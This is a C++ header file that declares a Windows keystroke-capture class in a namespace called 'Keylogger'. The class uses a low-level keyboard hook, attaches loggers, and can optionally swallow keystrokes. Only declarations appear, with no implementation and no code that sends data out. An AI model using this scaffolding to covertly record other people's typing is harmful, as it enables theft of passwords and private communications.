#ifndef KEYSTROKE_CAPTURER_WINDOWS
#define KEYSTROKE_CAPTURER_WINDOWS

#include "IKeystrokeCapturer.h"
#include "ILogger.h"

#include <vector>
#include <windows.h>

namespace Keylogger {

class KeystrokeCapturerWindows : public IKeystrokeCapturer {
 public:
    bool start();
    void stop();

    void consumeKeystrokes(bool consume);
    void addLogger(ILogger* logger);

 private:
    //find a way to make these not static
    static std::vector<ILogger*> _loggers;
    static bool _consumeKeystrokes;
    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

    HHOOK _keyboardHook;
};

}

#endif // KEYSTROKE_CAPTURER_WINDOWS
